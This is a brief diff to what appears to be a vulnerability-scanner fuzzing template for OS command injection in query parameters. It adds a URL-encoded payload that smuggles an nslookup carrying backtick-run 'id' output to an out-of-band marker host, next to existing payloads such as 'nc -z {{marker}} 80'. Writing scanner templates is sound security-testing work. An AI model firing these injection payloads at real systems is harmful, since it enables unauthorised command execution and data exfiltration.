@@ -102,6 +102,7 @@ requests:
         - "ls > /dev/null; nc -z {{marker}} 80"
         - "%26id%26"
         - ""\`id`""
+        - "%26nslookup%20-q%3dcname%20%%60id%60{{marker}}.%26'%5c%22%600"
     fuzzing:
       - part: query
         type: postfix
